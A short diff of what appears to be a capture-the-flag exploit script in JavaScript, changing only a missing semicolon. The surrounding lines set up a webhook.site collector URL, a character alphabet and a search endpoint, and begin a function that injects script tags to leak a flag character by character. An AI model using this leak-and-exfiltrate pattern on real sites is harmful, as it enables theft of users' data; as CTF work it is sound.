@@ -10,7 +10,7 @@ var hook = 'https://webhook.site/3fec1021-2d5a-44ec-a591-8bc65a7157bc';
 var flag = 'Ba';
 var abc = '-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
 var special = '_%\"\'';
-var url1 = 'http://'+${ip}+'/api/entries/search?q='
+var url1 = 'http://'+${ip}+'/api/entries/search?q=';
 async function getPartialFlag(char){
  return new Promise((resolve, reject)=>{
  const script = document.createElement("script");
